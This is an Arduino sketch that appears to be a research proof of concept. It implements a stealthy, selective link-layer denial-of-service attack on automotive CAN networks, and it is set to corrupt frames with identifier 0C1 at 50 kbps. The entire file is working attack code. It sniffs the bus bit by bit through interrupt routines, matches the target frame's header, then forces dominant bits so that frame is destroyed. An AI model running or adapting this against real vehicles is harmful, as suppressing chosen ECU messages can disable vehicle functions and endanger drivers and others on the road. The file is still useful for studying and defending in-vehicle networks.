/* 
 *  "A Stealth, Selective, Link-layer Denial-of-Service Attack Against Automotive Networks"
 *  Arduino Uno Rev 3 DoS Implementation
 *  
 *  Uno R3 specific implementation changes with respect to proposed attack algorithm:
 *  - First RXD falling edge waiting and Attack ISR enabling implemented via another ISR
 *    (RXD Falling Edge ISR) which monitors the RXD value and triggers on RXD falling edge;
 *  - Buffer is split into two variables due to size requirements reasons;
 *  - In Attack ISR, after dominant bit writing, Attack ISR disables itself for  
 *    performance optimizations reasons. It is re-enabled by RXD Falling Edge ISR;
 *  - In Attack ISR, slightly increased overwriting time in order to compensate 
 *    for possible Arduino interrupts timing drifts.
 *    
 *  Implementation is set to perform the DoS attack against a CAN frame with 
 *  identifier 0C1 on 11 bit / 50 kbps.
 *  
 *  CAN target value explaination:
 *  254 -> 1111 1110 | 14369 -> 0011 1000 0010 0001
 *  1111111000111000001000;
 *  1111111 = preceding data EoF/remote EoF/error delimiter/overload
 *            delimiter + minimum interframe spacing;
 *  0 = SoF;
 *  001110000010 = Base ID + 1 stuff bit
 *            ^-stuff
 *  0 = RTR;
 *  0 = IDE;
 *  0 = reserve bit (r0)
 *  1xxx = number of bytes of data (0-8)
 *  x ...0-64... x = data
 *  x ... 15 ... x = CRC
 */

byte CANBuffer1 = 0;
unsigned short CANBuffer2 = 0;

void setup() {
  noInterrupts();
  
  // TXD <- Recessive
  pinMode(2, INPUT_PULLUP);
  pinMode(4, OUTPUT);
  digitalWrite(4, 1);
  
  // Buffer <- 111...1
  CANBuffer1 = 255;
  CANBuffer2 = 65535;
  
  // Set timer to expire every CAN bit time seconds
  TIMSK2 = 0;
  TCCR2A = 0;
  TCCR2B = 0;
  OCR2A = 39; //Max top value for counter
  bitSet(TCCR2A, WGM21); //Mode 2 = CTC 
  TCNT2 = 38; //counter value
  bitSet(TIFR2, OCF2A);
  bitSet(TIMSK2, OCIE2A);
  
  // Enable RXD Falling Edge ISR
  EIMSK = 0;
  EICRA = 0;
  bitSet(EICRA, ISC01); //EICRA = external interrupt control register
  bitSet(EIFR, INTF0); //EIFR = external interrupt flag register
  bitSet(EIMSK, INT0); //EIMSK = external interrupt mask
  
  interrupts();
}

void loop() {
}

ISR(INT0_vect) {
  EIMSK = 0; // Disable RXD Falling Edge ISR
  bitSet(TCCR2B, CS21); // Enable Attack ISR
}

ISR(TIMER2_COMPA_vect) {
  if (CANBuffer1 == 254 && CANBuffer2 == 14369){
    delayMicroseconds(36); // Wait until first recessive bit (~10us per bit = 3 bits)
    bitClear(PORTD,4); // TXD <- Dominant
    delayMicroseconds(24); // Wait CAN bit time seconds (~10us per bit = 2 bits)
    bitSet(PORTD,4); // TXD <- Recessive

    // Disable Attack ISR
    TCCR2B = 0;
    TCNT2 = 38;
    bitSet(TIFR2, OCF2A);

    // Buffer <- 111...1
    CANBuffer1 = 255;
    CANBuffer2 = 65535;
    
    // Enable RXD Falling Edge ISR
    bitSet(EIFR, INTF0);
    bitSet(EIMSK, INT0);
  } else {
    // Append RXD value to Buffer
    // <--0000 0000<--0000 0000 0000 0000<-- (PIND, 2)
    //     buffer1          buffer2
    CANBuffer1 = CANBuffer1 << 1;
    CANBuffer1 = CANBuffer1 | bitRead(CANBuffer2, 15);
    CANBuffer2 = CANBuffer2 << 1;
    CANBuffer2 = CANBuffer2 | bitRead(PIND, 2);
  }
}
